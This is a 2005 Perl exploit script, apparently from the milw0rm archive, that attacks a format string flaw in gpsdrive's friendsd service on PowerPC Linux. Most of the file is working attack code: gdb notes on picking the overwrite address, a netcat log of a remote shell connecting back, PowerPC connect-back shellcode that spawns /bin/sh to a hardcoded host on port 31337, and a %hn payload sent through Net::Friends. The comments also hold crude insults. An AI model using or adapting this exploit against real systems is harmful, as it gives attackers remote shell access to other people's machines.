@@ -1,0 +1,179 @@
+#!/usr/bin/perl -w
+# 
+# Heh - Code by KF (kf_lists[at]digital_munition[dot]com)
+#     - Shellcode by Charles Stevenson
+# http://www.digitalmunition.com
+#
+# FrSIRT 24/24 & 7/7 - Centre de Recherche on Donkey Testicles. 
+# Free 14 day Testicle licking trial available! 
+#
+#                           IIIIIIIIII
+#                           I::::::::I
+#                           I::::::::I
+#                           II::::::II
+#                             I::::I
+#                             I::::I ##     ##  #######  ########  ##    ##
+#                             I::::I ##     ## ##     ## ##     ##   ####
+# EEEEEEEEEEEEEEEEEEEEEE      I::::I ##     ## ##     ## ########     ##
+# E::::::::::::::::::::E      I::::I  ##   ##  ##     ## ##   ##      ##
+# E::::::::::::::::::::E      I::::I   ## ##   ##     ## ##    ##     ##
+# EE::::::EEEEEEEEE::::E      I::::I    ###     #######  ##     ##    ##
+#   E:::::E       EEEEEE      I::::I
+#   E:::::E                 II::::::II
+#   E::::::EEEEEEEEEE       I::::::::I
+#   E:::::::::::::::E  and  I::::::::I
+#   E:::::::::::::::E       IIIIIIIIII
+#   E::::::EEEEEEEEEE    ########   #######  ##    ## ##    ##
+#   E:::::E              ##     ## ##     ## ###   ##  ##  ##
+#   E:::::E       EEEEEE ##     ## ##     ## ####  ##   ####
+# EE::::::EEEEEEEE:::::E ########  ##     ## ## ## ##    ##
+# E::::::::::::::::::::E ##     ## ##     ## ##  ####    ##
+# E::::::::::::::::::::E ##     ## ##     ## ##   ###    ##
+# EEEEEEEEEEEEEEEEEEEEEE ########   #######  ##    ##    ##
+# (Kickin you all up in your grill piece since the early 90's)
+#                                                      
+# friendsd.c:367:   fprintf (stderr, txt);
+#
+# Tested against: gpsdrive_2.09-2_powerpc.deb
+#
+# Crash the program and go to frame 2
+# 0x0f67d1e0 in vfprintf () from /lib/tls/libc.so.6
+# (gdb) bt
+# #0  0x0f67d1e0 in vfprintf () from /lib/tls/libc.so.6
+# #1  0x0f67cc74 in vfprintf () from /lib/tls/libc.so.6
+# #2  0x0f6825d0 in fprintf () from /lib/tls/libc.so.6
+# #3  0x100024b8 in dg_echo ()
+# #4  0x10002f28 in main ()
+#
+# Grab the address of Arglist for frame 2 and overwrite that +4
+# (gdb) i f
+# Stack level 2, frame at 0x7fffad70:
+# pc = 0xf6825d0 in fprintf; saved pc 0x100024b8
+# called by frame at 0x7fffae00, caller of frame at 0x7fff8700
+# Arglist at 0x7fffad70, args:
+# Locals at 0x7fffad70, Previous frame's sp in r1
+#
+# (gdb) x/a 0x7fffad70+4
+# 0x7fffad74:     0xf6825d0 <fprintf+112>  (overwrite this)
+#
+# animosity:/home/kfinisterre# nc -l -p 31337 -vvv
+# listening on [any] 31337 ...
+# 192.168.1.1: inverse host lookup failed: Unknown host
+# connect to [192.168.1.1] from (UNKNOWN) [192.168.1.1] 3349
+# id;
+# uid=1000(kfinisterre) gid=1000(kfinisterre) 
+# groups=20(dialout),24(cdrom),25(floppy),29(audio),44(video),46(plugdev),1000(kfinisterre)
+# uname -a;
+# Linux animosity 2.6.11-powerpc #1 Fri May 13 15:47:19 CEST 2005 ppc GNU/Linux
+#
+# This is NOT reliable or robust... Find your own damn pointers to overwrite
+
+use Net::Friends;
+use Data::Dumper;
+
+$shellcode  =
+"\x69\x69\x69\x69"  .  
+# /* connect-core5.c by Charles Stevenson <core@bokeoa.com> */
+"\x7c\x3f\x0b\x78" . #/*mr    r31,r1*/
+"\x3b\x40\x01\x0e" . #/*li    r26,270*/
+"\x3b\x5a\xfe\xf4" . #/*addi  r26,r26,-268*/
+"\x7f\x43\xd3\x78" . #/*mr    r3,r26*/
+"\x3b\x60\x01\x0d" . #/*li    r27,269*/
+"\x3b\x7b\xfe\xf4" . #/*addi  r27,r27,-268*/
+"\x7f\x64\xdb\x78" . #/*mr    r4,r27*/
+"\x7c\xa5\x2a\x78" . #/*xor   r5,r5,r5*/
+"\x7c\x3c\x0b\x78" . #/*mr    r28,r1*/
+"\x3b\x9c\x01\x0c" . #/*addi  r28,r28,268*/
+"\x90\x7c\xff\x08" . #/*stw   r3,-248(r28)*/
+"\x90\x9c\xff\x0c" . #/*stw   r4,-244(r28)*/
+"\x90\xbc\xff\x10" . #/*stw   r5,-240(r28)*/
+"\x7f\x63\xdb\x78" . #/*mr    r3,r27*/
+"\x3b\xdf\x01\x0c" . #/*addi  r30,r31,268*/
+"\x38\x9e\xff\x08" . #/*addi  r4,r30,-248*/
+"\x3b\x20\x01\x98" . #/*li    r25,408*/
+"\x7f\x20\x16\x70" . #/*srawi r0,r25,2*/
+"\x44\xde\xad\xf2" . #/*.long0x44deadf2*/
+"\x7c\x78\x1b\x78" . #/*mr    r24,r3*/
+"\xb3\x5e\xff\x16" . #/*sth   r26,-234(r30)*/
+"\x7f\xbd\xea\x78" . #/*xor   r29,r29,r29*/
+#// Craft your exploit to poke these value in. Right now it's set
+#// for port 31337 and ip 192.168.1.1. Here's an example
+#// core@morpheus:~$ printf "0x%02x%02x\n0x%02x%02x\n" 192 168 1 1
+#// 0xc0a8
+#// 0x0101
+"\x63\xbd" .  # /* PORT # */ 
+"\x7a\x69" .  #/*ori   r29,r29,31337*/
+"\xb3\xbe\xff\x18" . #/*sth   r29,-232(r30)*/
+"\x3f\xa0" . # /*IP(A.B) */ 
+#"\x42\x07" . # wtf is this?
+"\xc0\xa8" . # /*lis   r29,-16216*/
+"\x63\xbd" . # /*IP(C.D) */ 
+#"\xa1\x39" . #  wtf is this? 
+"\x01\x01" . # /*ori   r29,r29,257*/
+"\x93\xbe\xff\x1a" . #/*stw   r29,-230(r30)*/
+"\x93\x1c\xff\x08" . #/*stw   r24,-248(r28)*/
+"\x3a\xde\xff\x16" . #/*addi  r22,r30,-234*/
+"\x92\xdc\xff\x0c" . #/*stw   r22,-244(r28)*/
+"\x3b\xa0\x01\x1c" . #/*li    r29,284*/
+"\x38\xbd\xfe\xf4" . #/*addi  r5,r29,-268*/
+"\x90\xbc\xff\x10" . #/*stw   r5,-240(r28)*/
+"\x7f\x20\x16\x70" . #/*srawi r0,r25,2*/
+"\x7c\x7a\xda\x14" . #/*add   r3,r26,r27*/
+"\x38\x9c\xff\x08" . #/*addi  r4,r28,-248*/
+"\x44\xde\xad\xf2" . #/*.long0x44deadf2*/
+"\x7f\x03\xc3\x78" . #/*mr    r3,r24*/
+"\x7c\x84\x22\x78" . #/*xor   r4,r4,r4*/
+"\x3a\xe0\x01\xf8" . #/*li    r23,504*/
+"\x7e\xe0\x1e\x70" . #/*srawi r0,r23,3*/
+"\x44\xde\xad\xf2" . #/*.long0x44deadf2*/
+"\x7f\x03\xc3\x78" . #/*mr    r3,r24*/
+"\x7f\x64\xdb\x78" . #/*mr    r4,r27*/
+"\x7e\xe0\x1e\x70" . #/*srawi r0,r23,3*/
+"\x44\xde\xad\xf2" . #/*.long0x44deadf2*/
+#// comment out the next 4 lines to save 16 bytes and lose stderr
+#//"\x7f\x03\xc3\x78"    /*mr    r3,r24*/
+#//"\x7f\x44\xd3\x78"    /*mr    r4,r26*/
+#//"\x7e\xe0\x1e\x70"    /*srawi r0,r23,3*/
+#//"\x44\xde\xad\xf2"    /*.long0x44deadf2*/
+"\x7c\xa5\x2a\x79" . #/*xor.  r5,r5,r5*/
+"\x42\x40\xff\x35" . #/*bdzl+ 10000454<main>*/
+"\x7f\x08\x02\xa6" . #/*mflr  r24*/
+"\x3b\x18\x01\x34" . #/*addi  r24,r24,308*/
+"\x98\xb8\xfe\xfb" . #/*stb   r5,-261(r24)*/	/* KF / Core / Ghandi mojo */
+"\x38\x78\xfe\xf4" . #/*addi  r3,r24,-268*/
+"\x90\x61\xff\xf8" . #/*stw   r3,-8(r1)*/
+"\x38\x81\xff\xf8" . #/*addi  r4,r1,-8*/
+"\x90\xa1\xff\xfc" . #/*stw   r5,-4(r1)*/
+"\x3b\xc0\x01\x60" . #/*li    r30,352*/
+"\x7f\xc0\x2e\x70" . #/*srawi r0,r30,5*/
+"\x44\xde\xad\xf2" . #/*.long0x44deadf2*/
+"/bin/shZ";     # /* Z will become NULL */
+
+$name = 'aaaaaaaa-aaaa';  
+ 
+$writeaddr = 0x7fffad74; # Saved ret in frame 2 Arglist+4 (inside gdb)
+$writeaddr = 0x7fffad94; # (outside gdb) Pladow! Kickin fools all up in the grill piece. 
+
+$addy  = pack('l', $writeaddr);
+$addy2 = pack('l', $writeaddr+2);
+
+#$instr = 0x7fffae84;  # Shellcode (inside gdb)
+$instr = 0x7fffaea4;  # Shellcode (outside gdb)
+
+$lo = ($instr >> 0) & 0xffff;
+$hi = ($instr >> 16) & 0xffff;
+		
+$hi = $hi - 0x4e;
+$lo = (0x10000 + $lo) - $hi - 0x50;		
+
+#$hi = 1; $lo =1;
+
+$dir = "$addy$addy2|%." . $hi . "d|%28\$hn|%." . $lo . "d|%29\$hn$shellcode";
+
+$friends = Net::Friends->new(shift || 'localhost');
+$friends->report(name => $name, lat => '1111', lon => '2222', speed => '3333', dir => $dir);
+print Dumper($friends->query);
+
+# P.S. Fsck drow! And did I mention k-otick blows! Gimme some freedom fries you bastards! 
+
+# milw0rm.com [2005-11-04]
